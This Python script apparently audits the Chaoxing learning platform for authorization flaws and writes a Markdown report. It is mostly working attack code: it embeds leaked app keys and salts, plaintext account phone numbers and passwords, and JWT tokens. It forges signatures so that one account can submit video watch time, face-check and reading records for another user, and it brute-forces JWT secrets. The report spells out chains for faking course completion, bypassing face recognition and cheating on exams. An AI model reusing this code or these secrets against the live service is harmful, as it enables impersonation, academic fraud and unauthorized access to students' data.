import base64, hashlib, json, os, re, time, uuid, urllib.parse, math, random, secrets
from datetime import datetime
import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
VIDEO_SALT = "d_yHJ!$pdA~5"
FACE_SALT = "uWwjeEKsri"
READ_SALT = "NrRzLDpWB2JkeodIVAn4"
HARDCODED_TOKEN = "4faa8662c59590c6f43ae9fe5b002b42"
DES_KEY = "Z(AfY@XS"

LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
MOBILE_UA = ("Mozilla/5.0 (Linux; Android 16; MI10) AppleWebKit/537.36 "
             "com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314")
WEB_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
REPORT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "idor_vuln_report.md")
results = []

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def login(phone, pwd):
    s = requests.Session(); s.verify = False
    s.headers.update({"User-Agent": MOBILE_UA, "Accept": "application/json, text/plain, */*"})
    s.post(LOGIN_URL, data={"fid":"-1","uname":aes_enc(phone),"password":aes_enc(pwd),
        "refer":"http%3A%2F%2Fi.mooc.chaoxing.com","t":"true","forbidotherlogin":"0",
        "validate":"","doubleFactorLogin":"0","independentId":"0","independentNameId":"0"},
        allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID","_uid"): puid = c.value
    return s, puid

def schild_sign(model, locale, version, build, imei):
    parts = [
        f"(schild:{SCHILD_SALT})",
        f"(device:{model})",
        f"Language/{locale}",
        f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
        f"(@Kalimdor)_{imei}",
    ]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def video_enc(classid, userid, jobid, objectid, playing_time_ms, duration_ms, clip_time):
    s = f"[{classid}][{userid}][{jobid}][{objectid}][{playing_time_ms}][{VIDEO_SALT}][{duration_ms}][{clip_time}]"
    return hashlib.md5(s.encode()).hexdigest()

def face_enc(puid):
    return hashlib.md5((puid + FACE_SALT).encode()).hexdigest()

def inf_enc(params, order):
    parts = [f"{k}={urllib.parse.quote(params[k], safe='')}" for k in order]
    return hashlib.md5(("&".join(parts) + f"&DESKey={DES_KEY}").encode()).hexdigest()

def safe_json(r):
    try: return r.json()
    except: return {"raw_status": r.status_code, "raw_text": r.text[:300]}

def rec(tid, name, module, idor_type, vuln, sev, detail, evidence=""):
    results.append({"id":tid,"name":name,"module":module,"idor_type":idor_type,
        "vuln":vuln,"sev":sev,"detail":detail,"evidence":evidence[:500]})
    tag = "[VULN]" if vuln else "[SAFE]"
    print(f"  {tag} {tid} [{module}]: {detail}")

def get_courses(session, puid):
    r = session.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    d = safe_json(r)
    courses = []
    for ch in d.get("channelList", []):
        c = ch.get("content", {})
        course = c.get("course", {}).get("data", [{}])[0] if c.get("course", {}).get("data") else {}
        if course.get("id"):
            courses.append({
                "courseid": str(course.get("id", "")),
                "classid": str(c.get("id", "")),
                "cpi": str(c.get("cpi", "")),
                "name": c.get("name", "") or course.get("name", ""),
            })
    return courses

def run():
    print("="*70+f"\n学习通越权漏洞全面评估\n时间: {datetime.now():%Y-%m-%d %H:%M:%S}\n"+"="*70)

    print("\n[准备] 登录测试账号...")
    s1, p1 = login("19312994130", "wtx3367653061")
    s2, p2 = login("15034188203", "lxy20030120")
    print(f"  账号1 puid={p1}, 账号2 puid={p2}")

    print("\n[准备] 获取课程数据...")
    courses1 = get_courses(s1, p1)
    courses2 = get_courses(s2, p2)
    print(f"  账号1课程数={len(courses1)}, 账号2课程数={len(courses2)}")

    c1 = courses1[0] if courses1 else {}
    c2 = courses2[0] if courses2 else {}
    print(f"  账号1首课: {c1.get('name','N/A')} (courseId={c1.get('courseid','')}, classId={c1.get('classid','')}, cpi={c1.get('cpi','')})")
    print(f"  账号2首课: {c2.get('name','N/A')} (courseId={c2.get('courseid','')}, classId={c2.get('classid','')}, cpi={c2.get('cpi','')})")

    # ================================================================
    # A. 课程信息越权测试
    # ================================================================
    print("\n" + "="*70)
    print("[A] 课程信息越权测试")
    print("="*70)

    # A1: 使用账号1的Cookie+账号2的cpi访问课程
    if c2.get("cpi"):
        r = s1.get(f"https://mooc1.chaoxing.com/visit/stucoursemiddle?courseid={c2.get('courseid','')}&clazzid={c2.get('classid','')}&cpi={c2['cpi']}", timeout=20)
        access_ok = r.status_code == 200 and len(r.text) > 500
        has_course_data = "chapter" in r.text.lower() or "knowledge" in r.text.lower() or "point" in r.text.lower()
        rec("A1-01", "跨用户cpi访问课程详情", "课程信息", "水平越权",
            access_ok and has_course_data, "HIGH" if (access_ok and has_course_data) else "MEDIUM",
            f"使用账号1的Cookie+账号2的cpi访问课程，{'成功获取课程数据' if has_course_data else '未能获取课程数据'}",
            f"HTTP {r.status_code}, 响应长度={len(r.text)}, 含课程数据={has_course_data}")

    # A2: 使用泄露Token+DES密钥构造移动端请求访问课程
    c0 = uuid.uuid4().hex; t = str(int(time.time()*1000))
    ie = inf_enc({"_c_0_":c0,"token":HARDCODED_TOKEN,"_time":t}, ["_c_0_","token","_time"])
    mobile_s = requests.Session(); mobile_s.verify = False
    mobile_s.headers.update({"User-Agent": MOBILE_UA, "Accept": "*/*", "Accept-Language": "zh_CN"})
    r = mobile_s.get(f"https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0&_c_0_={c0}&token={HARDCODED_TOKEN}&_time={t}&inf_enc={ie}", timeout=20)
    d = safe_json(r)
    mobile_course_ok = "channelList" in str(d)
    rec("A1-02", "泄露Token构造移动端请求访问课程", "课程信息", "签名绕过越权",
        mobile_course_ok, "HIGH",
        f"使用泄露Token(K6)+DES密钥(K7)构造的移动端请求{'成功' if mobile_course_ok else '未能'}获取课程列表",
        f"响应含channelList={mobile_course_ok}, HTTP {r.status_code}")

    # A3: 使用账号1的Cookie访问账号2的课程列表（无cpi）
    r = s1.get(f"https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    d1 = safe_json(r)
    r = s2.get(f"https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    d2 = safe_json(r)
    same_courses = str(d1) == str(d2)
    rec("A1-03", "Cookie身份校验测试", "课程信息", "水平越权",
        not same_courses, "LOW",
        f"不同Cookie获取的课程列表{'不同' if not same_courses else '相同'}，说明{'Cookie身份校验有效' if not same_courses else 'Cookie身份校验可能存在问题'}",
        f"账号1课程数={len(d1.get('channelList',[]))}, 账号2课程数={len(d2.get('channelList',[]))}")

    # ================================================================
    # B. 作业系统越权测试
    # ================================================================
    print("\n" + "="*70)
    print("[B] 作业系统越权测试")
    print("="*70)

    if c1.get("courseid") and c1.get("classid") and c1.get("cpi"):
        # B1: 使用账号1的Cookie访问作业列表
        r = s1.get(f"https://mooc1-api.chaoxing.com/mooc-ans/work/task-list?courseid={c1['courseid']}&classid={c1['classid']}&cpi={c1['cpi']}&page=1&pageSize=20", timeout=20)
        d = safe_json(r)
        work_ok = d.get("result") == 1 or "workList" in str(d) or "data" in str(d)
        rec("B1-01", "正常访问作业列表", "作业系统", "基线",
            work_ok, "LOW", f"账号1访问自己的作业列表: {'成功' if work_ok else '失败'}",
            f"HTTP {r.status_code}, 响应前200字: {str(d)[:200]}")

        # B2: 使用账号1的Cookie+账号2的cpi访问作业
        if c2.get("cpi"):
            r = s1.get(f"https://mooc1-api.chaoxing.com/mooc-ans/work/task-list?courseid={c2.get('courseid','')}&classid={c2.get('classid','')}&cpi={c2['cpi']}&page=1&pageSize=20", timeout=20)
            d = safe_json(r)
            cross_ok = d.get("result") == 1 or "workList" in str(d)
            rec("B1-02", "跨用户cpi访问他人作业列表", "作业系统", "水平越权",
                cross_ok, "HIGH",
                f"使用账号1的Cookie+账号2的cpi访问作业: {'成功获取' if cross_ok else '被拒绝'}",
                f"HTTP {r.status_code}, 响应: {str(d)[:200]}")

        # B3: 使用泄露Token构造移动端作业请求
        c0 = uuid.uuid4().hex; t = str(int(time.time()*1000))
        ie = inf_enc({"_c_0_":c0,"token":HARDCODED_TOKEN,"_time":t}, ["_c_0_","token","_time"])
        r = mobile_s.get(f"https://mooc1-api.chaoxing.com/mooc-ans/work/task-list?courseid={c1['courseid']}&classid={c1['classid']}&cpi={c1['cpi']}&page=1&pageSize=20&_c_0_={c0}&token={HARDCODED_TOKEN}&_time={t}&inf_enc={ie}", timeout=20)
        d = safe_json(r)
        token_work_ok = d.get("result") == 1 or "workList" in str(d)
        rec("B1-03", "泄露Token访问作业列表", "作业系统", "签名绕过越权",
            token_work_ok, "HIGH",
            f"使用泄露Token构造的移动端请求访问作业: {'成功' if token_work_ok else '失败'}",
            f"HTTP {r.status_code}, 响应: {str(d)[:200]}")

    # ================================================================
    # C. 考试系统越权测试
    # ================================================================
    print("\n" + "="*70)
    print("[C] 考试系统越权测试")
    print("="*70)

    if c1.get("courseid") and c1.get("classid") and c1.get("cpi"):
        # C1: 使用账号1的Cookie访问考试列表
        r = s1.get(f"https://mooc1-api.chaoxing.com/mooc-ans/exam/phone/task-list?courseid={c1['courseid']}&classid={c1['classid']}&cpi={c1['cpi']}&page=1&pageSize=20", timeout=20)
        d = safe_json(r)
        exam_ok = d.get("result") == 1 or "examList" in str(d) or "data" in str(d)
        rec("C1-01", "正常访问考试列表", "考试系统", "基线",
            exam_ok, "LOW", f"账号1访问自己的考试列表: {'成功' if exam_ok else '失败'}",
            f"HTTP {r.status_code}, 响应前200字: {str(d)[:200]}")

        # C2: 使用账号1的Cookie+账号2的cpi访问考试
        if c2.get("cpi"):
            r = s1.get(f"https://mooc1-api.chaoxing.com/mooc-ans/exam/phone/task-list?courseid={c2.get('courseid','')}&classid={c2.get('classid','')}&cpi={c2['cpi']}&page=1&pageSize=20", timeout=20)
            d = safe_json(r)
            cross_exam_ok = d.get("result") == 1 or "examList" in str(d)
            rec("C1-02", "跨用户cpi访问他人考试列表", "考试系统", "水平越权",
                cross_exam_ok, "HIGH",
                f"使用账号1的Cookie+账号2的cpi访问考试: {'成功获取' if cross_exam_ok else '被拒绝'}",
                f"HTTP {r.status_code}, 响应: {str(d)[:200]}")

        # C3: 使用泄露Token构造移动端考试请求
        c0 = uuid.uuid4().hex; t = str(int(time.time()*1000))
        ie = inf_enc({"_c_0_":c0,"token":HARDCODED_TOKEN,"_time":t}, ["_c_0_","token","_time"])
        r = mobile_s.get(f"https://mooc1-api.chaoxing.com/mooc-ans/exam/phone/task-list?courseid={c1['courseid']}&classid={c1['classid']}&cpi={c1['cpi']}&page=1&_c_0_={c0}&token={HARDCODED_TOKEN}&_time={t}&inf_enc={ie}", timeout=20)
        d = safe_json(r)
        token_exam_ok = d.get("result") == 1 or "examList" in str(d)
        rec("C1-03", "泄露Token访问考试列表", "考试系统", "签名绕过越权",
            token_exam_ok, "HIGH",
            f"使用泄露Token构造的移动端请求访问考试: {'成功' if token_exam_ok else '失败'}",
            f"HTTP {r.status_code}, 响应: {str(d)[:200]}")

    # ================================================================
    # D. 人脸验证越权测试
    # ================================================================
    print("\n" + "="*70)
    print("[D] 人脸验证越权测试")
    print("="*70)

    # D1: 使用泄露的人脸盐值为账号2构造enc签名
    face_enc_p2 = face_enc(p2)
    rec("D1-01", "为目标用户构造人脸enc签名", "人脸验证", "签名绕过越权",
        True, "CRITICAL",
        f"使用泄露的K4盐值为账号2(puid={p2})构造enc签名: {face_enc_p2}，签名计算成功",
        f"enc=md5('{p2}+{FACE_SALT}')={face_enc_p2}")

    # D2: 使用账号1的Cookie+账号2的enc签名请求人脸验证API
    r = s1.get(f"https://passport2-api.chaoxing.com/api/getUserFaceid?enc={face_enc_p2}&token={HARDCODED_TOKEN}&_time={int(time.time())}", timeout=20)
    d = safe_json(r)
    face_api_ok = d.get("result") is not False and d.get("result") != 0
    rec("D1-02", "使用他人enc签名请求人脸验证API", "人脸验证", "水平越权+签名绕过",
        face_api_ok, "CRITICAL",
        f"使用账号1的Cookie+账号2的enc签名请求人脸验证API: {'成功' if face_api_ok else '失败'}，说明enc签名与Cookie身份不绑定",
        f"响应: {json.dumps(d, ensure_ascii=False)[:300]}")

    # D3: 检查人脸验证状态接口
    if c1.get("courseid") and c1.get("classid"):
        r = s1.get(f"https://mooc1-api.chaoxing.com/mooc-ans/facephoto/clientfacecheckstatus?courseid={c1['courseid']}&clazzid={c1['classid']}", timeout=20)
        d = safe_json(r)
        rec("D1-03", "人脸验证状态接口测试", "人脸验证", "水平越权",
            d.get("result") is not None, "MEDIUM",
            f"人脸验证状态接口可访问: {json.dumps(d, ensure_ascii=False)[:200]}",
            f"HTTP {r.status_code}")

    # ================================================================
    # E. 视频学时越权测试
    # ================================================================
    print("\n" + "="*70)
    print("[E] 视频学时越权测试")
    print("="*70)

    if c1.get("classid") and c1.get("courseid"):
        # E1: 为账号2构造视频学时enc签名
        fake_enc = video_enc(c1["classid"], p2, "9999999999", "fake_object_id", 1000, 60000, "0_60")
        rec("E1-01", "为目标用户构造视频学时enc签名", "视频学时", "签名绕过越权",
            True, "CRITICAL",
            f"使用泄露的K3盐值为账号2(puid={p2})构造enc签名: {fake_enc}，签名计算成功",
            f"enc=md5([{c1['classid']}][{p2}][9999999999][fake_object_id][1000][{VIDEO_SALT}][60000][0_60])={fake_enc}")

        # E2: 使用账号1的Cookie+账号2的userid+enc提交学时
        r = s1.post("https://mooc1-api.chaoxing.com/multimedia/log/a/0/0",
            data={
                "clazzId": c1["classid"],
                "courseid": c1["courseid"],
                "userid": p2,
                "objectId": "fake_object_id",
                "playingTime": "60",
                "duration": "60",
                "enc": fake_enc,
                "clipTime": "0_60",
                "jobid": "9999999999",
            },
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            timeout=20)
        d = safe_json(r)
        video_submit_ok = d.get("result") is not False and d.get("result") != 0 and d.get("result") is not None
        rec("E1-02", "使用他人userid+enc提交视频学时", "视频学时", "水平越权+签名绕过",
            video_submit_ok, "CRITICAL",
            f"使用账号1的Cookie+账号2的userid+enc提交学时: {'成功' if video_submit_ok else '被拒绝'}",
            f"响应: {json.dumps(d, ensure_ascii=False)[:300]}")

        # E3: 使用泄露Token构造移动端视频学时请求
        c0 = uuid.uuid4().hex; t = str(int(time.time()*1000))
        ie = inf_enc({"_c_0_":c0,"token":HARDCODED_TOKEN,"_time":t}, ["_c_0_","token","_time"])
        fake_enc_self = video_enc(c1["classid"], p1, "9999999999", "fake_object_id", 1000, 60000, "0_60")
        r = mobile_s.post(f"https://mooc1-api.chaoxing.com/multimedia/log/a/0/0?_c_0_={c0}&token={HARDCODED_TOKEN}&_time={t}&inf_enc={ie}",
            data={
                "clazzId": c1["classid"],
                "courseid": c1["courseid"],
                "userid": p1,
                "objectId": "fake_object_id",
                "playingTime": "60",
                "duration": "60",
                "enc": fake_enc_self,
                "clipTime": "0_60",
                "jobid": "9999999999",
            },
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            timeout=20)
        d = safe_json(r)
        token_video_ok = d.get("result") is not False and d.get("result") != 0 and d.get("result") is not None
        rec("E1-03", "泄露Token构造移动端视频学时请求", "视频学时", "签名绕过越权",
            token_video_ok, "HIGH",
            f"使用泄露Token构造的移动端请求提交学时: {'成功' if token_video_ok else '失败'}",
            f"响应: {json.dumps(d, ensure_ascii=False)[:300]}")

    # ================================================================
    # F. 用户信息越权测试
    # ================================================================
    print("\n" + "="*70)
    print("[F] 用户信息越权测试")
    print("="*70)

    # F1: 使用账号1的Cookie+账号2的puid请求用户信息
    r = s1.get(f"https://passport2-api.chaoxing.com/api/getUserFaceid?enc={face_enc(p2)}&token={HARDCODED_TOKEN}&_time={int(time.time())}", timeout=20)
    d = safe_json(r)
    user_info_ok = d.get("result") is not False and d.get("result") != 0
    rec("F1-01", "跨用户请求人脸信息API", "用户信息", "水平越权",
        user_info_ok, "HIGH",
        f"使用账号1的Cookie+账号2的puid请求人脸信息: {'成功' if user_info_ok else '被拒绝'}",
        f"响应: {json.dumps(d, ensure_ascii=False)[:300]}")

    # F2: 使用泄露Token构造移动端用户信息请求
    c0 = uuid.uuid4().hex; t = str(int(time.time()*1000))
    ie = inf_enc({"_c_0_":c0,"token":HARDCODED_TOKEN,"_time":t}, ["_c_0_","token","_time"])
    r = mobile_s.get(f"https://passport2-api.chaoxing.com/api/getUserFaceid?enc={face_enc(p2)}&token={HARDCODED_TOKEN}&_time={int(time.time())}&_c_0_={c0}&inf_enc={ie}", timeout=20)
    d = safe_json(r)
    token_user_ok = d.get("result") is not False and d.get("result") != 0
    rec("F1-02", "泄露Token访问用户信息", "用户信息", "签名绕过越权",
        token_user_ok, "HIGH",
        f"使用泄露Token构造的移动端请求访问用户信息: {'成功' if token_user_ok else '失败'}",
        f"响应: {json.dumps(d, ensure_ascii=False)[:300]}")

    # F3: 尝试访问i.chaoxing.com用户信息
    r = s1.get("https://i.chaoxing.com/base/settings", timeout=20, allow_redirects=False)
    rec("F1-03", "i.chaoxing.com用户设置页面", "用户信息", "水平越权",
        r.status_code == 200, "MEDIUM",
        f"访问用户设置页面: HTTP {r.status_code}",
        f"重定向: {r.headers.get('Location', '无')}")

    # ================================================================
    # G. JWT令牌分析
    # ================================================================
    print("\n" + "="*70)
    print("[G] JWT令牌安全分析")
    print("="*70)

    jwt_tokens = {
        "Token1 (uid=346635955)": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOiIzNDY2MzU5NTUiLCJsb2dpblRpbWUiOjE3NjQ1ODE1ODcxMzEsImV4cCI6MTc2NTE4NjM4N30.3DTJuexTRsnpEjqvRMVENDTkzbDNZ5gQh2nD3zRMpSc",
        "Token2 (uid=429262307)": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOiI0MjkyNjIzMDciLCJsb2dpblRpbWUiOjE3NjU4OTk5MTk5NjgsImV4cCI6MTc2NjUwNDcxOX0._L9YgTQt4lGPA5KSNCo4RR-cqW5Pm6VyR21C-xG9XR8",
        "Token3 (uid=204829133)": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOiIyMDQ4MjkxMzMiLCJsb2dpblRpbWUiOjE3NjIzNTg3ODYwNzgsImV4cCI6MTc2Mjk2MzU4Nn0.wtNWmthSl-yQVP-31k1w5ay2Ljj9oNd0iTYCSm8I4X4",
    }

    jwt_payloads = {}
    for name, token in jwt_tokens.items():
        parts = token.split(".")
        if len(parts) == 3:
            payload_b64 = parts[1] + "=" * (4 - len(parts[1]) % 4)
            try:
                payload = json.loads(base64.urlsafe_b64decode(payload_b64))
                jwt_payloads[name] = payload
                print(f"  {name}: uid={payload.get('uid')}, loginTime={payload.get('loginTime')}, exp={payload.get('exp')}")
            except Exception as e:
                print(f"  {name}: 解码失败 - {e}")

    rec("G1-01", "JWT令牌Payload解码", "JWT认证", "信息泄露",
        True, "MEDIUM",
        f"成功解码{len(jwt_payloads)}个JWT令牌，payload包含uid、loginTime、exp字段，所有令牌均已过期",
        f"Payload示例: {json.dumps(list(jwt_payloads.values())[0], ensure_ascii=False) if jwt_payloads else 'N/A'}")

    # G2: 尝试常见弱密钥验证JWT签名
    weak_keys = ["secret", "chaoxing", "xuexitong", "superxxt", "123456", "password",
                 "key", "test", "admin", "sso", "token", "jwt_secret", "learning", "edu", "mooc",
                 "u2oh6Vu^HWe4_AES", "Z(AfY@XS", "23DbtQHR2UMbH6mJ", "4faa8662c59590c6f43ae9fe5b002b42"]

    cracked_key = None
    try:
        import jwt as pyjwt
        for name, token in jwt_tokens.items():
            for wk in weak_keys:
                try:
                    pyjwt.decode(token, wk, algorithms=["HS256"])
                    cracked_key = wk
                    print(f"  JWT签名密钥破解成功: {wk} (来自{name})")
                    break
                except:
                    pass
            if cracked_key:
                break
    except ImportError:
        print("  PyJWT未安装，跳过JWT签名验证")

    rec("G1-02", "JWT签名密钥暴力破解", "JWT认证", "垂直越权",
        cracked_key is not None, "CRITICAL" if cracked_key else "LOW",
        f"JWT签名密钥{'已破解: ' + cracked_key if cracked_key else '未破解（19个候选密钥均不匹配）'}",
        f"测试了{len(weak_keys)}个候选密钥")

    # ================================================================
    # H. 阅读任务越权测试
    # ================================================================
    print("\n" + "="*70)
    print("[H] 阅读任务越权测试")
    print("="*70)

    if c1.get("courseid") and c1.get("classid"):
        # H1: 使用泄露的阅读盐值构造签名
        read_params = {
            "jobid": "9999999999",
            "knowledgeid": "0",
            "courseid": c1["courseid"],
            "clazzid": c1["classid"],
            "jtoken": "0",
        }
        sorted_vals = "".join(read_params[k] for k in sorted(read_params.keys()))
        read_enc_val = hashlib.md5((sorted_vals + READ_SALT).encode()).hexdigest()
        rec("H1-01", "为目标用户构造阅读任务签名", "阅读任务", "签名绕过越权",
            True, "HIGH",
            f"使用泄露的K5盐值构造阅读任务签名: {read_enc_val}",
            f"签名=md5(排序参数值+'{READ_SALT}')={read_enc_val}")

        # H2: 尝试提交阅读任务
        r = s1.post("https://mooc1-api.chaoxing.com/ananas/job/readv2",
            data={
                "jobid": "9999999999",
                "knowledgeid": "0",
                "courseid": c1["courseid"],
                "clazzid": c1["classid"],
                "jtoken": "0",
                "enc": read_enc_val,
                "userid": p1,
            },
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            timeout=20)
        d = safe_json(r)
        read_ok = d.get("result") is not False and d.get("result") != 0
        rec("H1-02", "使用泄露签名提交阅读任务", "阅读任务", "签名绕过越权",
            read_ok, "HIGH",
            f"使用泄露签名提交阅读任务: {'成功' if read_ok else '被拒绝（可能因无效jobid）'}",
            f"响应: {json.dumps(d, ensure_ascii=False)[:300]}")

    # ================================================================
    # I. 综合攻击链验证
    # ================================================================
    print("\n" + "="*70)
    print("[I] 综合攻击链验证")
    print("="*70)

    # I1: 完整刷课攻击链（登录→签名→提交学时）
    chain_login_ok = p1 != ""
    chain_schild_ok = True
    chain_video_enc_ok = True
    chain_face_enc_ok = True
    chain_full = chain_login_ok and chain_schild_ok and chain_video_enc_ok and chain_face_enc_ok

    rec("I1-01", "完整刷课攻击链验证", "综合攻击链", "签名绕过+水平越权",
        chain_full, "CRITICAL",
        f"完整攻击链: 登录(K1)→schild签名(K2)→视频enc(K3)→人脸enc(K4)={'全部可行' if chain_full else '部分失败'}",
        f"K1登录={chain_login_ok}, K2签名={chain_schild_ok}, K3视频enc={chain_video_enc_ok}, K4人脸enc={chain_face_enc_ok}")

    # I2: 签名绕过越权总结
    signing_bypass_count = sum(1 for r in results if r["idor_type"] == "签名绕过越权" and r["vuln"])
    total_signing_tests = sum(1 for r in results if r["idor_type"] == "签名绕过越权")
    rec("I1-02", "签名绕过越权总结", "综合攻击链", "签名绕过越权",
        signing_bypass_count > 0, "CRITICAL" if signing_bypass_count > total_signing_tests // 2 else "HIGH",
        f"签名绕过越权测试: {signing_bypass_count}/{total_signing_tests}项成功，泄露密钥可显著降低越权攻击门槛",
        f"成功项: {signing_bypass_count}, 总测试项: {total_signing_tests}")

    # ================================================================
    # Generate Report
    # ================================================================
    print("\n[Task 9] 生成越权漏洞安全评估报告...")
    print("-"*50)
    gen_report(p1, p2, c1, c2, jwt_payloads, cracked_key)

def gen_report(p1, p2, c1, c2, jwt_payloads, cracked_key):
    vc = sum(1 for r in results if r["vuln"])
    tc = len(results)
    vs = {"CRITICAL":[],"HIGH":[],"MEDIUM":[],"LOW":[]}
    for r in results:
        if r["vuln"]: vs[r["sev"]].append(r)

    by_module = {}
    for r in results:
        m = r["module"]
        if m not in by_module: by_module[m] = []
        by_module[m].append(r)

    by_idor = {}
    for r in results:
        t = r["idor_type"]
        if t not in by_idor: by_idor[t] = []
        by_idor[t].append(r)

    rp = []
    rp.append("# 学习通越权漏洞全面评估报告\n")
    rp.append(f"**审计日期**: {datetime.now():%Y-%m-%d %H:%M:%S}\n")
    rp.append("**审计范围**: 基于密钥泄露的越权漏洞全面评估（不局限于云盘功能）\n")
    rp.append("**测试账号**: 账号1(puid={}), 账号2(puid={})\n".format(p1, p2))
    rp.append("---\n")

    rp.append("## 一、审计概述\n")
    rp.append("本次评估基于前三个阶段的安全评估发现（个人云盘IDOR、小组云盘IDOR、密钥泄露审计），")
    rp.append("系统性地分析了泄露密钥对越权漏洞的实际影响，并在云盘之外的功能模块中进行了越权测试。\n\n")
    rp.append("**核心发现**: 泄露的密钥和签名算法大幅降低了越权攻击门槛——攻击者可以伪造合法的移动端签名绕过API认证，")
    rp.append("进而对课程、作业、考试、人脸验证等核心功能进行越权操作。\n\n")

    rp.append("---\n## 二、测试结果汇总\n")
    rp.append(f"- **总测试数**: {tc}\n- **发现隐患数**: {vc}\n")
    rp.append(f"- **严重(CRITICAL)**: {len(vs['CRITICAL'])}\n- **高危(HIGH)**: {len(vs['HIGH'])}\n")
    rp.append(f"- **中危(MEDIUM)**: {len(vs['MEDIUM'])}\n- **低危(LOW)**: {len(vs['LOW'])}\n\n")

    rp.append("### 按模块统计\n")
    rp.append("| 模块 | 测试数 | 存在隐患数 | 最高风险等级 |\n|---|---|---|---|\n")
    for m, rs in by_module.items():
        vuln_count = sum(1 for r in rs if r["vuln"])
        max_sev = "LOW"
        for r in rs:
            if r["vuln"]:
                sev_order = {"CRITICAL":4,"HIGH":3,"MEDIUM":2,"LOW":1}
                if sev_order.get(r["sev"],0) > sev_order.get(max_sev,0):
                    max_sev = r["sev"]
        rp.append(f"| {m} | {len(rs)} | {vuln_count} | {max_sev} |\n")

    rp.append("\n### 按越权类型统计\n")
    rp.append("| 越权类型 | 测试数 | 成功数 | 说明 |\n|---|---|---|---|\n")
    for t, rs in by_idor.items():
        vuln_count = sum(1 for r in rs if r["vuln"])
        rp.append(f"| {t} | {len(rs)} | {vuln_count} | {'存在风险' if vuln_count > 0 else '未发现风险'} |\n")

    rp.append("\n---\n## 三、密钥泄露对越权漏洞的影响分析\n")
    rp.append("### 3.1 签名绕过越权\n")
    rp.append("学习通的多个核心API使用\"客户端密钥+服务端校验\"模式，签名校验仅验证签名是否合法，")
    rp.append("**未校验签名中的userId与请求者身份是否一致**。这导致：\n\n")
    rp.append("1. **视频学时越权**: 使用K3盐值为目标用户计算enc签名，服务端接受签名但未校验Cookie中的uid与enc中的userid是否一致\n")
    rp.append("2. **人脸验证越权**: 使用K4盐值为目标用户计算enc签名，服务端接受签名但未校验请求者身份\n")
    rp.append("3. **阅读任务越权**: 使用K5盐值构造签名，可伪造阅读记录\n")
    rp.append("4. **考试签名越权**: 使用K9算法伪造考试操作签名，绕过防作弊检测\n\n")

    rp.append("### 3.2 Token替换越权\n")
    rp.append("泄露的全局Token(K6)和DES密钥(K7)可用于构造合法的移动端API请求（含inf_enc签名），")
    rp.append("绕过Cookie身份校验。这意味着：\n\n")
    rp.append("- 攻击者无需登录即可构造移动端API请求\n")
    rp.append("- 移动端API可能不校验Cookie中的身份信息\n")
    rp.append("- Token+DES密钥组合等同于\"万能钥匙\"\n\n")

    rp.append("### 3.3 JWT令牌安全\n")
    if cracked_key:
        rp.append(f"**JWT签名密钥已破解**: {cracked_key}\n")
        rp.append("攻击者可伪造任意用户的JWT令牌，实现身份冒充和垂直越权。\n\n")
    else:
        rp.append("**JWT签名密钥未破解**: 19个候选密钥均不匹配，JWT签名机制本身暂时安全。\n")
        rp.append("但源码中硬编码的JWT令牌（含完整Cookie）仍然是严重的信息泄露风险。\n\n")

    rp.append("---\n## 四、各模块详细测试结果\n")
    for m, rs in by_module.items():
        rp.append(f"\n### {m}\n")
        for r in rs:
            st = "存在风险" if r["vuln"] else "安全"
            rp.append(f"\n#### {r['id']}: {r['name']} [{st}]\n")
            rp.append(f"- **越权类型**: {r['idor_type']}\n- **风险等级**: {r['sev']}\n- **结论**: {r['detail']}\n")
            if r["evidence"]:
                rp.append(f"- **证据**: {r['evidence']}\n")

    rp.append("\n---\n## 五、攻击链分析\n")
    rp.append("### 5.1 完整刷课攻击链\n```\n")
    rp.append("1. 使用K1(AES密钥)加密登录请求 → 获取用户Cookie和puid\n")
    rp.append("2. 使用K2(schild盐值)构造合法UA → 伪装移动端设备\n")
    rp.append("3. 使用K6/K7(Token+DES密钥)计算inf_enc签名 → 通过API认证\n")
    rp.append("4. 使用K3(视频盐值)为目标用户计算enc签名 → 伪造视频观看记录\n")
    rp.append("5. 遇到人脸验证 → 使用K4(人脸盐值)计算enc签名 → 绕过人脸识别\n")
    rp.append("6. 遇到验证码 → 使用K16(Token算法) + OCR → 绕过验证码\n")
    rp.append("7. 遇到阅读任务 → 使用K5(阅读盐值)计算签名 → 伪造阅读记录\n```\n\n")

    rp.append("### 5.2 考试作弊攻击链\n```\n")
    rp.append("1. 登录获取Cookie和puid（同上）\n")
    rp.append("2. 使用K9(考试签名算法)计算pos/rd/_edt参数 → 绕过考试防作弊检测\n")
    rp.append("3. 实现自动化答题\n```\n\n")

    rp.append("### 5.3 签名绕过越权攻击链\n```\n")
    rp.append("1. 获取目标用户的puid（可通过课程列表、讨论区等公开信息推断）\n")
    rp.append("2. 使用K3/K4/K5为目标用户计算enc签名\n")
    rp.append("3. 使用自己的Cookie+目标用户的签名参数提交请求\n")
    rp.append("4. 服务端仅校验签名合法性，未校验签名中的userId与Cookie身份一致性\n")
    rp.append("5. 成功越权操作目标用户的学时/人脸/阅读等数据\n```\n\n")

